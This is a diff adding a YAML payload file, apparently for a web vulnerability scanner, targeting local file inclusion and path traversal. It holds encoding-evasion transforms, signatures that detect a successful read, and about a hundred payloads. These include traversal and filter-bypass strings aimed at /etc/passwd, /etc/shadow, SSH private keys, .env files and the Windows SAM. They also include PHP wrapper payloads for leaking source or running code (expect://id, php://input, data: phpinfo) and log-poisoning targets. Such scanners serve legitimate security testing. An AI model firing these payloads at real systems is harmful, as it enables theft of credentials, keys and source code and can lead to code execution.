@@ -1,0 +1,154 @@
+name: lfi
+description: Local File Inclusion / Path Traversal (leitura de arquivos, wrappers PHP, /proc)
+detectors: [signature]
+diff_len_ratio: 0.40
+
+# transforms de bypass aplicados a CADA payload -> multiplica a cobertura de evasão
+transforms:
+  - url
+  - url_double
+  - url_all
+  - utf8_overlong
+  - unicode_iis
+  - backslash
+  - double_slash
+  - mixed_slash
+  - null_ext_suffix
+  - case_random
+  - fullwidth
+
+# assinaturas de leitura bem-sucedida (inclui base64 de /etc/passwd e <?php,
+# para pegar php://filter/convert.base64-encode)
+signatures:
+  - 'root:.*:0:0:'
+  - 'daemon:.*:/usr/sbin'
+  - 'bin:x:1:1:'
+  - 'nobody:.*:/nonexistent'
+  - '\[boot loader\]'
+  - '\[fonts\]'
+  - '\[extensions\]'
+  - 'for 16-bit app support'
+  - '; for 16-bit app support'
+  - 'HTTP_USER_AGENT'
+  - 'DOCUMENT_ROOT='
+  - 'SCRIPT_FILENAME='
+  - 'PATH=/usr/'
+  - 'cm9vdDo'          # base64("root:")  -> php://filter base64 de /etc/passwd
+  - 'PD9waHA'          # base64("<?php")  -> php://filter base64 de fonte PHP
+  - 'H4sIA'            # gzip+base64 comum em filter chains
+  - '<\?php'
+
+payloads:
+  # --- traversal Unix, profundidades variadas ---
+  - { value: '../etc/passwd', tags: [unix] }
+  - { value: '../../etc/passwd', tags: [unix] }
+  - { value: '../../../etc/passwd', tags: [unix] }
+  - { value: '../../../../etc/passwd', tags: [unix] }
+  - { value: '../../../../../etc/passwd', tags: [unix] }
+  - { value: '../../../../../../etc/passwd', tags: [unix] }
+  - { value: '../../../../../../../../etc/passwd', tags: [unix] }
+  - { value: '/etc/passwd', tags: [unix, absolute] }
+  - { value: 'file:///etc/passwd', tags: [unix, wrapper] }
+  # --- bypass de filtro que remove "../" uma vez ---
+  - { value: '....//....//....//....//etc/passwd', tags: [unix, bypass] }
+  - { value: '..././..././..././etc/passwd', tags: [unix, bypass] }
+  - { value: '....\/....\/....\/etc/passwd', tags: [unix, bypass] }
+  - { value: '..%2f..%2f..%2f..%2fetc/passwd', tags: [unix, bypass, preencoded] }
+  - { value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', tags: [unix, bypass, preencoded] }
+  # --- truncamento / normalização ---
+  - { value: '/etc/passwd/./././././././.', tags: [unix, truncation] }
+  - { value: '../../../../etc/passwd/.', tags: [unix, truncation] }
+  - { value: '/etc//////passwd', tags: [unix] }
+  - { value: '/./etc/./passwd', tags: [unix] }
+  # --- wrappers PHP (leitura de fonte/arquivo) ---
+  - { value: 'php://filter/convert.base64-encode/resource=/etc/passwd', tags: [php, wrapper] }
+  - { value: 'php://filter/read=convert.base64-encode/resource=index.php', tags: [php, wrapper, source] }
+  - { value: 'php://filter/convert.base64-encode/resource=index', tags: [php, wrapper, source] }
+  - { value: 'php://filter/read=string.rot13/resource=/etc/passwd', tags: [php, wrapper] }
+  - { value: 'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd', tags: [php, wrapper, chain] }
+  - { value: 'pHp://FiLtEr/convert.base64-encode/resource=/etc/passwd', tags: [php, wrapper, case] }
+  - { value: 'php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd', tags: [php, wrapper] }
+  - { value: 'expect://id', tags: [php, wrapper, rce] }
+  - { value: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+', tags: [php, wrapper, rce] }
+  - { value: 'phar://test.phar/test.txt', tags: [php, wrapper] }
+  - { value: 'zip://shell.jpg%23payload.php', tags: [php, wrapper] }
+  # --- /proc (leak de ambiente/args, log poisoning) ---
+  - { value: '/proc/self/environ', tags: [unix, proc] }
+  - { value: '/proc/self/cmdline', tags: [unix, proc] }
+  - { value: '/proc/self/fd/0', tags: [unix, proc] }
+  - { value: '/proc/self/status', tags: [unix, proc] }
+  - { value: '../../../../proc/self/environ', tags: [unix, proc] }
+  # --- logs (candidatos a log poisoning -> RCE) ---
+  - { value: '../../../../var/log/apache2/access.log', tags: [unix, log] }
+  - { value: '../../../../var/log/nginx/access.log', tags: [unix, log] }
+  - { value: '../../../../var/log/auth.log', tags: [unix, log] }
+  # --- Windows ---
+  - { value: '..\..\..\..\windows\win.ini', tags: [windows] }
+  - { value: '..\..\..\..\..\..\windows\win.ini', tags: [windows] }
+  - { value: 'C:\windows\win.ini', tags: [windows, absolute] }
+  - { value: 'C:\boot.ini', tags: [windows, absolute] }
+  - { value: '..%5c..%5c..%5c..%5cwindows%5cwin.ini', tags: [windows, preencoded] }
+  - { value: '/../../../../../../windows/win.ini', tags: [windows] }
+  - { value: 'file:///c:/windows/win.ini', tags: [windows, wrapper] }
+  # --- variações que exploram append de extensão (?, #, null) ---
+  - { value: '/etc/passwd%00', tags: [unix, nullbyte] }
+  - { value: '../../../../etc/passwd%00.php', tags: [unix, nullbyte] }
+  # --- UNC / SMB (Windows SSRF-ish via include) ---
+  - { value: '\\\\127.0.0.1\\c$\\windows\\win.ini', tags: [windows, unc] }
+  # --- profundidades extras + arquivos sensíveis Unix ---
+  - { value: '../../../../../../../../../../etc/passwd', tags: [unix, deep] }
+  - { value: '../../../../../../../../../../../../etc/passwd', tags: [unix, deep] }
+  - { value: '/etc/shadow', tags: [unix, absolute] }
+  - { value: '/etc/hosts', tags: [unix, absolute] }
+  - { value: '/etc/hostname', tags: [unix, absolute] }
+  - { value: '/etc/issue', tags: [unix, absolute] }
+  - { value: '/etc/group', tags: [unix, absolute] }
+  - { value: '/etc/mysql/my.cnf', tags: [unix, config] }
+  - { value: '/etc/apache2/apache2.conf', tags: [unix, config] }
+  - { value: '/etc/nginx/nginx.conf', tags: [unix, config] }
+  - { value: '/etc/ssh/sshd_config', tags: [unix, config] }
+  - { value: '/root/.bash_history', tags: [unix, home] }
+  - { value: '/root/.ssh/id_rsa', tags: [unix, home, key] }
+  - { value: '/home/user/.ssh/id_rsa', tags: [unix, home, key] }
+  - { value: '/var/www/html/index.php', tags: [unix, source] }
+  - { value: '/var/www/html/config.php', tags: [unix, source] }
+  - { value: '/var/www/html/wp-config.php', tags: [unix, source, wordpress] }
+  - { value: '/app/.env', tags: [unix, env] }
+  - { value: '/.env', tags: [unix, env] }
+  - { value: '../.env', tags: [unix, env] }
+  - { value: '../../.env', tags: [unix, env] }
+  - { value: '../../../.env', tags: [unix, env] }
+  # --- /proc extras ---
+  - { value: '/proc/version', tags: [unix, proc] }
+  - { value: '/proc/self/maps', tags: [unix, proc] }
+  - { value: '/proc/self/mounts', tags: [unix, proc] }
+  - { value: '/proc/1/cmdline', tags: [unix, proc] }
+  - { value: '/proc/net/tcp', tags: [unix, proc] }
+  # --- wrappers PHP extras / chains ---
+  - { value: 'php://filter/convert.base64-encode/resource=config.php', tags: [php, source] }
+  - { value: 'php://filter/convert.base64-encode/resource=../config.php', tags: [php, source] }
+  - { value: 'php://filter/convert.base64-encode/resource=/var/www/html/index.php', tags: [php, source] }
+  - { value: 'php://filter/convert.iconv.utf-16le.utf-8/resource=/etc/passwd', tags: [php, wrapper] }
+  - { value: 'php://filter/string.toupper|convert.base64-encode/resource=/etc/passwd', tags: [php, chain] }
+  - { value: 'php://input', tags: [php, wrapper, rce] }
+  - { value: 'php://fd/0', tags: [php, wrapper] }
+  - { value: 'php://memory', tags: [php, wrapper] }
+  - { value: 'glob://*', tags: [php, wrapper] }
+  - { value: 'compress.zlib://file:///etc/passwd', tags: [php, wrapper] }
+  - { value: 'compress.bzip2://file:///etc/passwd', tags: [php, wrapper] }
+  - { value: 'data:text/plain,<?php phpinfo();?>', tags: [php, rce] }
+  # --- Windows extras ---
+  - { value: 'C:\windows\system32\drivers\etc\hosts', tags: [windows, absolute] }
+  - { value: 'C:\windows\system32\config\SAM', tags: [windows, sam] }
+  - { value: 'C:\windows\repair\SAM', tags: [windows, sam] }
+  - { value: 'C:\windows\debug\NetSetup.log', tags: [windows] }
+  - { value: 'C:\inetpub\wwwroot\web.config', tags: [windows, iis] }
+  - { value: '..\..\..\..\..\..\..\..\windows\win.ini', tags: [windows, deep] }
+  - { value: '..%c0%af..%c0%af..%c0%afwindows%c0%afwin.ini', tags: [windows, overlong] }
+  # --- bypass extras (mistura de encoding/dot) ---
+  - { value: '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', tags: [unix, overlong] }
+  - { value: '%252e%252e%252fetc%252fpasswd', tags: [unix, double] }
+  - { value: '..%255c..%255c..%255cwindows%255cwin.ini', tags: [windows, double] }
+  - { value: '....//....//....//....//....//etc/passwd', tags: [unix, bypass] }
+  - { value: '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', tags: [unix, bypass] }
+  - { value: '/%2e%2e/%2e%2e/%2e%2e/etc/passwd', tags: [unix, bypass] }
